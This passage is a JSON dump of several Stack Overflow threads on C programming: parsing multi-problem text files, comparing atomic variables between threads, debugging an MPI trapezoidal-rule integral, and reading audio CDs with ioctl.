"Why is there no accepted answer while the question is <b>[SOLVED]</b>?"}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 6135803, "user_type": "registered", "profile_image": "https://graph.facebook.com/1085348714820920/picture?type=large", "display_name": "Jorge Proen&#231;a", "link": "https://stackoverflow.com/users/6135803/jorge-proen%c3%a7a"}, "edited": false, "score": 0, "creation_date": 1542238445, "post_id": 53310312, "comment_id": 93501462, "body": "how can i do the part of while file has remaining content"}, {"owner": {"reputation": 12260, "user_id": 1730895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6abb0b52473d614852289b49ccf3c3c?s=128&d=identicon&r=PG", "display_name": "Kingsley", "link": "https://stackoverflow.com/users/1730895/kingsley"}, "reply_to_user": {"reputation": 11, "user_id": 6135803, "user_type": "registered", "profile_image": "https://graph.facebook.com/1085348714820920/picture?type=large", "display_name": "Jorge Proen&#231;a", "link": "https://stackoverflow.com/users/6135803/jorge-proen%c3%a7a"}, "edited": false, "score": 0, "creation_date": 1542238601, "post_id": 53310312, "comment_id": 93501529, "body": "@JorgeProen&#231;a - Only read the data you need as you are dealing with it.  Once you have read the <b>height</b> lines of array data, the program knows the next line should be blank, and then there&#39;s another problem.  The <code>feof()</code> function can be used to test if the program has read past end-of-file.  So try to read the blank line, and if (after that read) <code>feof()</code> returns true, there is no more problems, otherwise, start reading the next problem-text."}, {"owner": {"reputation": 12260, "user_id": 1730895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6abb0b52473d614852289b49ccf3c3c?s=128&d=identicon&r=PG", "display_name": "Kingsley", "link": "https://stackoverflow.com/users/1730895/kingsley"}, "reply_to_user": {"reputation": 11, "user_id": 6135803, "user_type": "registered", "profile_image": "https://graph.facebook.com/1085348714820920/picture?type=large", "display_name": "Jorge Proen&#231;a", "link": "https://stackoverflow.com/users/6135803/jorge-proen%c3%a7a"}, "edited": false, "score": 0, "creation_date": 1542238749, "post_id": 53310312, "comment_id": 93501564, "body": "Actually, if ever you read a blank line, it indicates there is a new problem in the file. (or the file is corrupt)."}], "tags": [], "owner": {"reputation": 12260, "user_id": 1730895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6abb0b52473d614852289b49ccf3c3c?s=128&d=identicon&r=PG", "display_name": "Kingsley", "link": "https://stackoverflow.com/users/1730895/kingsley"}, "is_accepted": false, "score": 1, "last_activity_date": 1542238494, "last_edit_date": 1542238494, "creation_date": 1542238134, "answer_id": 53310312, "question_id": 53310119, "link": "https://stackoverflow.com/questions/53310119/how-can-i-read-multiple-problems-from-a-file/53310312#53310312", "title": "How can i read multiple problems from a file?", "body": "<p>When tackling this sort of problem (or any programming task, really), it's often beneficial to write some <em>pseudo-code</em>, just in words about what the program needs to do.</p>\n\n<p>Do Problem</p>\n\n<ul>\n<li>Open the file</li>\n<li>While file has remaining content\n\n<ul>\n<li>read a line of text\n\n<ul>\n<li>extract the <strong>width</strong> from that line</li>\n<li>extract the <strong>height</strong> from that line</li>\n<li>extract the <strong>problem-type</strong> \"A\" or \"B\" from that line</li>\n<li>IF <strong>problem-type</strong> is \"A\"</li>\n<li>extract the <strong>???</strong> last number from the line</li>\n<li>IF <strong>problem-type</strong> is \"B\"</li>\n<li>extract the remaining 2+ numbers from the line</li>\n</ul></li>\n<li>read a line of text\n\n<ul>\n<li>extract the <strong>start-point-x</strong> from that line</li>\n<li>extract the <strong>start-point-y</strong> from that line</li>\n</ul></li>\n<li>read <strong>height</strong> lines of text from the file\n\n<ul>\n<li>With each line, extract <strong>width</strong> numbers for <strong>array_data</strong></li>\n</ul></li>\n<li>read a blank line</li>\n</ul></li>\n</ul>\n\n<p>(EDIT: It looks like I maxed-out the indentation levels, but you get the idea)</p>\n\n<p>So now the problem is broken up into smaller, hopefully more manageable problems.</p>\n"}, {"comments": [{"owner": {"reputation": 11, "user_id": 6135803, "user_type": "registered", "profile_image": "https://graph.facebook.com/1085348714820920/picture?type=large", "display_name": "Jorge Proen&#231;a", "link": "https://stackoverflow.com/users/6135803/jorge-proen%c3%a7a"}, "edited": false, "score": 0, "creation_date": 1542239689, "post_id": 53310380, "comment_id": 93501815, "body": "something like i eddited now?"}, {"owner": {"reputation": 656, "user_id": 9592917, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "reply_to_user": {"reputation": 11, "user_id": 6135803, "user_type": "registered", "profile_image": "https://graph.facebook.com/1085348714820920/picture?type=large", "display_name": "Jorge Proen&#231;a", "link": "https://stackoverflow.com/users/6135803/jorge-proen%c3%a7a"}, "edited": false, "score": 0, "creation_date": 1542242167, "post_id": 53310380, "comment_id": 93502466, "body": "do you want to read the whole line at once to make sure it has a unique identifier, or assume the first line starts the problem and after you read all the lines your back to the start of the next problem.  If your program works feel free to use it."}], "tags": [], "owner": {"reputation": 656, "user_id": 9592917, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "is_accepted": false, "score": 0, "last_activity_date": 1542238670, "creation_date": 1542238670, "answer_id": 53310380, "question_id": 53310119, "link": "https://stackoverflow.com/questions/53310119/how-can-i-read-multiple-problems-from-a-file/53310380#53310380", "title": "How can i read multiple problems from a file?", "body": "<p>Here is some sample sudo code on how it may be possible to structure your program.  You will have to modify things heavily but you said you just needed to read the second problem.</p>\n\n<pre><code>#define MAX_SIZE (100) //or whatever it is\n#define UNIQUE_IDENTIFIER \"=\" //or whatever it is\n\nFILE * fp = NULL;\nint problem_counter = 0;\nchar * line = malloc(sizeof(char)*MAX_SIZE);\n\nif(!(fp = fopen(\"problem.txt\",\"r\"))){\n  do_error_handling();\n}\n\ndo{\nprintf(\"This is the %dth problem\", ++problem_counter); //dont need to printf this but you can start counting here.\nif(fgets(line,MAX_SIZE,fp) == NULL){\n  break;\n}\nif(strstr(line,UNIQUE_IDENTIFIER){\n  //start of problem.  maybe read in all the lines here and build up the problem you have to solve\n  read_problem(line); //does special stuff based of the first line read\n  solve_problem(); //solve the problem based on the stuff you extracted from reading the problem\n}\nwhile(!feof(fp));\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 6135803, "user_type": "registered", "profile_image": "https://graph.facebook.com/1085348714820920/picture?type=large", "display_name": "Jorge Proen&#231;a", "link": "https://stackoverflow.com/users/6135803/jorge-proen%c3%a7a"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 32, "favorite_count": 1, "answer_count": 2, "score": 0, "last_activity_date": 1546246770, "creation_date": 1542236997, "last_edit_date": 1546246770, "question_id": 53310119, "link": "https://stackoverflow.com/questions/53310119/how-can-i-read-multiple-problems-from-a-file", "title": "How can i read multiple problems from a file?", "body": "<p>I have to read a txt file wich h\u00e1s the first line to describe the problem.  It can be either a or b, then i have some ints and as matrix. My program works for both, but there are files that after the first problem may have anothers with the same format. I dont khow how to do this. Help pls.<br>\nsample of txt:</p>\n\n<pre><code>5 5 A(B) 1 \n0 3 (start point)\u00b4\n1 5 6 5 9\n5 8 6 3 1\n8 6 9 5 3 \n5 6 9 3 0\n2 3 9 3 8\n</code></pre>\n\n<p>then another problem, or more,  with this format</p>\n\n<pre><code>while(!feof(fp)){\n  fscanf(fp, \"%d %d %c %d\", &amp;L, &amp;C, &amp;variante, &amp;pontos);\n\n\n  mapa=(int **)malloc(L*sizeof(int*));\n  for(i=0; i&lt;L; i++){\n    mapa[i]=(int*)malloc(C*sizeof(int));\n  }\n  for(i=0; i&lt;L; i++){\n    for(j=0; j&lt;C; j++){\n      mapa[i][j]=0;\n    }\n  }\n\n  if(variante == 'A') {\n    fscanf(fp, \"%d %d\", &amp;Linit, &amp;cinit);\n    for(i=0; i&lt;L; i++){\n      for(j=0; j&lt;C; j++){\n        fscanf(fp, \"%d\", &amp;mapa[i][j]);\n        printf(\"%d-\", mapa[i][j]);\n      }\n\n      printf(\"\\n\");\n    }\n    possivel=varianteA(mapa, L, C, Linit, cinit, &amp;custo);\n    printf(\"%d\\n\",custo);\n  }\n  if(variante== 'B'){\n    line=(int*)malloc(pontos*sizeof(int));\n    col=(int*)malloc(pontos*sizeof(int));\n    for(k=0; k&lt;pontos; k++){\n      line[k]=0;\n      col[k]=0;\n    }\n    for(k=0; k&lt;pontos; k++){\n      fscanf(fp, \"%d %d\", &amp;line[k], &amp;col[k]);\n    }\n    for(i=0; i&lt;L; i++){\n      for(j=0; j&lt;C; j++){\n        fscanf(fp, \"%d\", &amp;mapa[i][j]);\n        printf(\"%d-\", mapa[i][j]);\n      }\n      printf(\"\\n\");\n    }\n      possivel=varianteB(mapa, L, C, &amp;custo, pontos, line, col);\n      printf(\"%d %d\\n\", possivel, custo);\n      free(line);\n      free(col);\n  }\n\n\n  for(i=0; i&lt;L; i++){\n    int *linha;\n    linha=mapa[i];\n    free(linha);\n  }\n  free(mapa);\n}\n//  free(variante);\n  fclose(fp);\n</code></pre>\n\n<p>now i have this, but it does one more problem that ist not in the file. and valgrind gives me an error in: possivel=varianteA(..). It says that adress is 0 bytes after block of siz 24 alloc'd</p>\n"}, {"tags": ["c", "linux", "gcc", "atomic", "glibc"], "comments": [{"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542236740, "post_id": 53309942, "comment_id": 93500913, "body": "what type is <code>atomic_ulong</code> ?"}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 5, "creation_date": 1542236870, "post_id": 53309942, "comment_id": 93500957, "body": "I think you&#39;ll need to wrap the entire <code>if</code> statement (and the increment) in protection. Your variables are individually atomic, but they are accessed twice in the <code>if</code> statement,, once for the comparison, again for the <code>printf</code>. They are locked down individually during each of those reads, but in between the comparison and the <code>printf</code>, the other thread could sneak in and increment <code>overwrap_cnt</code>"}, {"owner": {"reputation": 4681, "user_id": 6651824, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/LWsU0.jpg?s=128&g=1", "display_name": "LWimsey", "link": "https://stackoverflow.com/users/6651824/lwimsey"}, "reply_to_user": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542236925, "post_id": 53309942, "comment_id": 93500976, "body": "@KamilCuk something like <code>typedef _Atomic unsigned long atomic_ulong</code>, it is defined in <code>stdatomic.h</code>"}, {"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542236977, "post_id": 53309942, "comment_id": 93500994, "body": "Och indeed, sorry."}, {"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542237448, "post_id": 53309942, "comment_id": 93501163, "body": "Well, have you tried using <code>atomic_store(&amp;overwrap_cnt, atomic_load(&amp;overwrap_cnt) + 1)</code> and <code>if (atomic_load(&amp;...) == atomic_load(&amp;...))</code> and so on?"}, {"owner": {"reputation": 4681, "user_id": 6651824, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/LWsU0.jpg?s=128&g=1", "display_name": "LWimsey", "link": "https://stackoverflow.com/users/6651824/lwimsey"}, "edited": false, "score": 0, "creation_date": 1542238027, "post_id": 53309942, "comment_id": 93501344, "body": "You did not, by accident, type a <code>;</code> semicolon at the end of the if-statement ?"}, {"owner": {"reputation": 656, "user_id": 9592917, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "edited": false, "score": 0, "creation_date": 1542239235, "post_id": 53309942, "comment_id": 93501700, "body": "if your sleeping for 100ms you may as well use a mutex.  what is the reason you chose atomic vs mutex?"}, {"owner": {"reputation": 1241, "user_id": 8424429, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9002f7998cce992a047bee84a5129c37?s=128&d=identicon&r=PG&f=1", "display_name": "curiousguy12", "link": "https://stackoverflow.com/users/8424429/curiousguy12"}, "reply_to_user": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "edited": false, "score": 0, "creation_date": 1542240414, "post_id": 53309942, "comment_id": 93502032, "body": "@yano The scenario you describe can happen once, but it does not explain why it keeps printing those lines"}, {"owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "edited": false, "score": 0, "creation_date": 1542240606, "post_id": 53309942, "comment_id": 93502069, "body": "Although it is not supposed to make a difference, you may want to try marking the variables as <code>volatile</code> to see if the behavior changes."}, {"owner": {"reputation": 2445, "user_id": 3476780, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/abf771bddcd864626a0e1499ccfc699b?s=128&d=identicon&r=PG&f=1", "display_name": "yano", "link": "https://stackoverflow.com/users/3476780/yano"}, "reply_to_user": {"reputation": 1241, "user_id": 8424429, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9002f7998cce992a047bee84a5129c37?s=128&d=identicon&r=PG&f=1", "display_name": "curiousguy12", "link": "https://stackoverflow.com/users/8424429/curiousguy12"}, "edited": false, "score": 0, "creation_date": 1542262361, "post_id": 53309942, "comment_id": 93507176, "body": "@curiousguy12 nothing in the code presented makes it remotely possible to get three <code>printf</code>s of 0 and 1, atomicity and threading issues aside. Presumably there is code elsewhere which decrements/resets the two values that the OP deemed unnecessary for the question. But as always, an MCVE would be ideal...... on second thought, <code>overwrap_cnt</code> could wrap around, but unless it reaching 0 is synced with the comparison (it&#39;s not in the code), that scenario would be highly unlikely, but could explain 3 <code>printf</code>s from the presented code."}], "answers": [{"tags": [], "owner": {"reputation": 1449, "user_id": 984986, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2113da6f02cd6428b92291c26ba11727?s=128&d=identicon&r=PG", "display_name": "Zrax", "link": "https://stackoverflow.com/users/984986/zrax"}, "is_accepted": false, "score": 0, "last_activity_date": 1542244150, "creation_date": 1542244150, "answer_id": 53311046, "question_id": 53309942, "link": "https://stackoverflow.com/questions/53309942/comparison-of-atomic-variables-in-c/53311046#53311046", "title": "Comparison of atomic variables in C", "body": "<p>Although the variables are individually atomic, your comparison loop is not.  Perhaps counter-intuitively, reading an atomic variable may generate more instructions than reading a non-atomic.</p>\n\n<p>Consider for example if you had written code with the same behavior using GCC's atomic builtins:</p>\n\n<pre><code>while(1)\n{\n  unsigned long _tmp1 = __atomic_load_n(&amp;overwrap_read_cnt, __ATOMIC_RELAXED);\n  unsigned long _tmp2 = __atomic_load_n(&amp;overwrap_cnt, __ATOMIC_RELAXED);\n  if (_tmp1 == _tmp2)\n  {\n    _tmp2 = __atomic_load_n(&amp;overwrap_cnt, __ATOMIC_RELAXED);\n    _tmp1 = __atomic_load_n(&amp;overwrap_read_cnt, __ATOMIC_RELAXED);\n    printf(\"or:%lu, ow:%lu \\n\", _tmp1, _tmp2);\n  }\n  usleep(100000);\n}\n</code></pre>\n\n<p>Although the values fetched for the comparison were determined to be equal, they may no longer be at the time they're fetched again for the printf call.</p>\n\n<p>If you want to ensure the values used later are the same as those in the if statement, you should fetch them only once, and then use the cached values throughout the rest of the loop iteration.</p>\n"}], "owner": {"reputation": 129, "user_id": 3323455, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/0b9663c1fd69ae46aad3e2c6423f2473?s=128&d=identicon&r=PG&f=1", "display_name": "pulse", "link": "https://stackoverflow.com/users/3323455/pulse"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 356, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1542244150, "creation_date": 1542236057, "last_edit_date": 1542238689, "question_id": 53309942, "link": "https://stackoverflow.com/questions/53309942/comparison-of-atomic-variables-in-c", "title": "Comparison of atomic variables in C", "body": "<p>I have 2 atomic variables:</p>\n\n<pre><code>atomic_ulong overwrap_cnt = 0;\natomic_ulong overwrap_read_cnt = 0;\n</code></pre>\n\n<p>One thread does the increasing of overwrap_cnt (once):</p>\n\n<pre><code>overwrap_cnt++;\n</code></pre>\n\n<p>Another thread does the comparison in an endless loop:</p>\n\n<pre><code>while(1)\n{\n if (overwrap_read_cnt == overwrap_cnt)\n {\n  printf(\"or:%lu, ow:%lu \\n\",overwrap_read_cnt, overwrap_cnt);\n }\n usleep(100000);\n}\n</code></pre>\n\n<p>However, the result is always the following:</p>\n\n<pre><code>or:0, ow:1\nor:0, ow:1\nor:0, ow:1\n</code></pre>\n\n<p>Somehow during the comparison the variables were equal, but when we printf them - we see that they are different. The result is the same for every iteration.</p>\n\n<p>Can't I compare atomic variables like this? Or what is wrong? </p>\n\n<p>It's on centos 7.5 with gcc (GCC) 4.9.2 20150212 (Red Hat 4.9.2-6)</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["c", "function", "pointers", "parallel-processing"], "comments": [{"owner": {"reputation": 8362, "user_id": 2993960, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/svN5z.jpg?s=128&g=1", "display_name": "Fiddling Bits", "link": "https://stackoverflow.com/users/2993960/fiddling-bits"}, "edited": false, "score": 1, "creation_date": 1542231923, "post_id": 53309169, "comment_id": 93499149, "body": "Maybe the infinite loop is happening because of this: <code>while(error &gt; min_error)</code>."}, {"owner": {"reputation": 11277, "user_id": 3657941, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/304d8d4cceca5f9ce2383ff97b53e36b?s=128&d=identicon&r=PG&f=1", "display_name": "David Cullen", "link": "https://stackoverflow.com/users/3657941/david-cullen"}, "edited": false, "score": 3, "creation_date": 1542231997, "post_id": 53309169, "comment_id": 93499179, "body": "Did you mean to write <code>tn = t2n</code>? I don&#39;t see <code>tn</code> getting updated."}, {"owner": {"reputation": 8362, "user_id": 2993960, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/svN5z.jpg?s=128&g=1", "display_name": "Fiddling Bits", "link": "https://stackoverflow.com/users/2993960/fiddling-bits"}, "edited": false, "score": 0, "creation_date": 1542232010, "post_id": 53309169, "comment_id": 93499182, "body": "Add <code>printf(&quot;%f &gt; %f\\n&quot;, error, min_error);</code> below <code>error = fabs(((3.0&#47;4.0) * t2n) - ((1.0&#47;3.0) * tn));</code>."}, {"owner": {"reputation": 168, "user_id": 8876034, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/BF2zR.jpg?s=128&g=1", "display_name": "Dariyoush", "link": "https://stackoverflow.com/users/8876034/dariyoush"}, "reply_to_user": {"reputation": 8362, "user_id": 2993960, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/svN5z.jpg?s=128&g=1", "display_name": "Fiddling Bits", "link": "https://stackoverflow.com/users/2993960/fiddling-bits"}, "edited": false, "score": 0, "creation_date": 1542232351, "post_id": 53309169, "comment_id": 93499325, "body": "@FiddlingBits it gives this &quot;0.000000 &gt; 0.000000&quot; immmm! well it means both errors are 0.0 here. that&#39;s wierd"}, {"owner": {"reputation": 8362, "user_id": 2993960, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/svN5z.jpg?s=128&g=1", "display_name": "Fiddling Bits", "link": "https://stackoverflow.com/users/2993960/fiddling-bits"}, "edited": false, "score": 0, "creation_date": 1542232386, "post_id": 53309169, "comment_id": 93499343, "body": "@Dariyoush Maybe you need <code>%lf</code> for <code>double</code>... not sure."}, {"owner": {"reputation": 52186, "user_id": 1553090, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/Wj4s1.png?s=128&g=1", "display_name": "paddy", "link": "https://stackoverflow.com/users/1553090/paddy"}, "edited": false, "score": 0, "creation_date": 1542233535, "post_id": 53309169, "comment_id": 93499817, "body": "They are <i>not</i> zero.  Use <code>%g</code> format specifier for scientific notation.  If in doubt, step through your program in a debugger."}, {"owner": {"reputation": 22495, "user_id": 5382650, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/THfCr.png?s=128&g=1", "display_name": "Craig Estey", "link": "https://stackoverflow.com/users/5382650/craig-estey"}, "edited": false, "score": 1, "creation_date": 1542235373, "post_id": 53309169, "comment_id": 93500485, "body": "In <code>part_of_integral</code>, you are calling a function <code>f</code> (which is <i>not</i> shown). Did you mean <code>func</code>? If so, the definition of <code>func</code> comes too late. Compile with <code>-Wall -Wextra</code> and fix any warnings. I&#39;d try to get this working with a <code>size</code> of 1 first to be sure your calculation code and functions are correct. Then, increase the size. This separates the calc debug from debugging your <code>MPI</code> code."}, {"owner": {"reputation": 11277, "user_id": 3657941, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/304d8d4cceca5f9ce2383ff97b53e36b?s=128&d=identicon&r=PG&f=1", "display_name": "David Cullen", "link": "https://stackoverflow.com/users/3657941/david-cullen"}, "reply_to_user": {"reputation": 22495, "user_id": 5382650, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/THfCr.png?s=128&g=1", "display_name": "Craig Estey", "link": "https://stackoverflow.com/users/5382650/craig-estey"}, "edited": false, "score": 1, "creation_date": 1542235642, "post_id": 53309169, "comment_id": 93500584, "body": "@CraigEstey <code>f</code> is a pointer to <code>func</code>."}], "owner": {"reputation": 168, "user_id": 8876034, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/BF2zR.jpg?s=128&g=1", "display_name": "Dariyoush", "link": "https://stackoverflow.com/users/8876034/dariyoush"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 210, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1542231837, "creation_date": 1542231837, "question_id": 53309169, "link": "https://stackoverflow.com/questions/53309169/parallel-trapezoidal-rule-in-c", "title": "parallel trapezoidal rule in C", "body": "<p>I wrote a program to calculate the given integral as a function by extended trapezoidal rule. it seems that I go into an infinite loop but I can't understand why. I think the problem is in do_cmd function. or something with reference and pointers. please help. I try to implement the collected communication. \nThank you in advance. </p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include &lt;math.h&gt;\n#include \"mpi.h\"\n\nint rank, size;\n\ndouble part_of_integral(int n_start, int n_end, double a, double b, double h, double(*f)(double)){\n    double temp = f(n_start * h + a) + f(n_end * h + a);\n    temp *= h;\n    temp /= 2.0;\n    int i;\n    for (i = n_start + 1; i &lt; n_end; ++i) {\n        temp += h * f(i * h);\n    }\n    return temp;\n}\ndouble func(double x){\n    return 1.0 / (1.0 + pow(x, 2.0));\n}\n\ndouble do_cmd(double* a, double* b, int* n){\n    MPI_Barrier(MPI_COMM_WORLD);\n    printf(\"a = %f, b = %f, n = %d, rank = %d\\n\", *a, *b, *n, rank);\n    MPI_Bcast(a, 1, MPI_DOUBLE, 0, MPI_COMM_WORLD);\n    MPI_Bcast(b, 1, MPI_DOUBLE, 0, MPI_COMM_WORLD);\n    MPI_Bcast(n, 1, MPI_INT, 0, MPI_COMM_WORLD);\n    printf(\"aa= %f, bb = %f, nn = %d, rankb = %d\\n\", *a, *b, *n, rank);\n\n    double h = (*b - *a) / *n;\n    int number_of_nodes = *n / size;\n    int n_start = rank * number_of_nodes;\n    int n_end = (rank + 1) * number_of_nodes;\n    double integral_output = part_of_integral(n_start, n_end, *a, *b, h, func);\n    double integral_result = 0.0;\n    MPI_Reduce(&amp;integral_output, &amp;integral_result, 1, MPI_DOUBLE, MPI_SUM, 0, MPI_COMM_WORLD);\n    if (rank == 0) {\n        integral_result *= 4.0;\n    }\n    return integral_result;\n}\n\nint main (int argc, char* argv[]) {\n    double a, b, tn, t2n;\n    int n;\n    double error = 1.0;\n    const double min_error = 1.0e-8;\n    MPI_Init(&amp;argc, &amp;argv);\n    MPI_Comm_size(MPI_COMM_WORLD, &amp;size);\n    MPI_Comm_rank(MPI_COMM_WORLD, &amp;rank);\n\n    tn = 0.0;\n    if (rank == 0) {\n            a = 0.0;\n            b = 1.0;\n            n = 2;  \n        }\n    while(error &gt; min_error) {\n\n\n        t2n = do_cmd(&amp;a, &amp;b, &amp;n);\n        error = fabs(((3.0/4.0) * t2n) - ((1.0/3.0) * tn));\n        if (rank == 0) {\n            printf (\"error: %f\\n\", error);\n            n *= 2;\n        }\n        t2n = tn;\n    }\n    if (rank == 0) {\n        printf (\"n = %d, 2n = %d, error = %f\\n\", n/2, n, error);\n    }\n    MPI_Finalize();\n    return 0;\n    }\n</code></pre>\n"}, {"tags": ["c", "ubuntu", "system-calls", "ioctl", "cd-rom"], "comments": [{"owner": {"reputation": 768, "user_id": 938740, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZWhew.png?s=128&g=1", "display_name": "torstenvl", "link": "https://stackoverflow.com/users/938740/torstenvl"}, "edited": false, "score": 1, "creation_date": 1542230683, "post_id": 53308161, "comment_id": 93498640, "body": "It would be helpful to other contributors if you shared some context.  Where did you find that example?"}, {"owner": {"reputation": 11, "user_id": 7815485, "user_type": "registered", "profile_image": "https://graph.facebook.com/406757316362575/picture?type=large", "display_name": "Dihia", "link": "https://stackoverflow.com/users/7815485/dihia"}, "reply_to_user": {"reputation": 768, "user_id": 938740, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZWhew.png?s=128&g=1", "display_name": "torstenvl", "link": "https://stackoverflow.com/users/938740/torstenvl"}, "edited": false, "score": 0, "creation_date": 1542237302, "post_id": 53308161, "comment_id": 93501110, "body": "i found about the function here : <a href=\"http://linux-sxs.org/bedtime/cdapi.html?fbclid=IwAR1ca7ht5jb8XpeHUuEfuZB85O3s2FBoNCkWa_Htm_GtQsit1Ea-SUfzqQ4\" rel=\"nofollow noreferrer\">linux-sxs.org/bedtime/&hellip;</a>"}], "answers": [{"tags": [], "owner": {"reputation": 59, "user_id": 9925774, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a3ddd633edf69e39f825ad6116ae8514?s=128&d=identicon&r=PG&f=1", "display_name": "abermeister479", "link": "https://stackoverflow.com/users/9925774/abermeister479"}, "is_accepted": false, "score": 2, "last_activity_date": 1561125861, "last_edit_date": 1561125861, "creation_date": 1561092011, "answer_id": 56696933, "question_id": 53308161, "link": "https://stackoverflow.com/questions/53308161/how-to-use-the-ioctl-function-with-audio-cd-drives/56696933#56696933", "title": "how to use the ioctl() function with audio CD drives", "body": "<p>According to the kernel documentation for the cdrom driver, <a href=\"https://github.com/torvalds/linux/blob/master/Documentation/ioctl/cdrom.txt\" rel=\"nofollow noreferrer\">cdrom.txt</a>, the format of the command is as follows:</p>\n\n<pre><code>CDROMREADAUDIO          (struct cdrom_read_audio)\n\nusage:\n\n  struct cdrom_read_audio ra;\n  ioctl(fd, CDROMREADAUDIO, &amp;ra);\n\ninputs:\n  cdrom_read_audio structure containing read start\n  point and length\n\noutputs:\n  audio data, returned to buffer indicated by ra\n\nerror return:\n  EINVAL    format not CDROM_MSF or CDROM_LBA\n  EINVAL    nframes not in range [1 75]\n  ENXIO     drive has no queue (probably means invalid fd)\n  ENOMEM    out of memory\n</code></pre>\n\n<p>The format of the <code>cdrom_read_audio</code> struct can be found in <a href=\"https://github.com/torvalds/linux/blob/master/include/uapi/linux/cdrom.h\" rel=\"nofollow noreferrer\">cdrom.h</a>:</p>\n\n<pre><code>/* This struct is used by the CDROMREADAUDIO ioctl */\nstruct cdrom_read_audio\n{\n    union cdrom_addr addr; /* frame address */\n    __u8 addr_format;      /* CDROM_LBA or CDROM_MSF */\n    int nframes;           /* number of 2352-byte-frames to read at once */\n    __u8 __user *buf;      /* frame buffer (size: nframes*2352 bytes) */\n};\n</code></pre>\n\n<p>It uses a <code>union cdrom_addr</code> type, defined in the same file:</p>\n\n<pre><code>/* Address in either MSF or logical format */\nunion cdrom_addr        \n{\n    struct cdrom_msf0   msf;\n    int                 lba;\n};\n</code></pre>\n\n<p>Here we have a choice - use MSF (Mintues-Seconds-Frames) or LBA (Logical Block Addressing). Since you're reading audio, you'll probably want MSF. <code>struct cdrom_msf0</code> can also be found in the header file:</p>\n\n<pre><code>/* Address in MSF format */\nstruct cdrom_msf0       \n{\n    __u8    minute;\n    __u8    second;\n    __u8    frame;\n};\n</code></pre>\n\n<p>With this research, we can write a simple test:</p>\n\n<pre><code>#include &lt;sys/ioctl.h&gt;    //Provides ioctl()\n#include &lt;linux/cdrom.h&gt;  //Provides struct and #defines\n#include &lt;unistd.h&gt;       